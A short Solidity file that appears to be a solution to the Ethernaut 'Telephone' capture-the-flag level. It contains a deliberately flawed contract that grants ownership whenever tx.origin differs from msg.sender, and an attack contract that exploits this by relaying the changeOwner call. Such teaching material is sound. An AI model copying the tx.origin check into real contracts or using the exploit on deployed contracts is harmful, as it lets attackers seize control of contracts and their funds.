// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract AttackTelephone {
    Telephone public telephone;
    constructor(Telephone _address) {
        telephone = Telephone(_address);
    }

    function attack(address _owner) external {
        telephone.changeOwner(_owner);
    }

}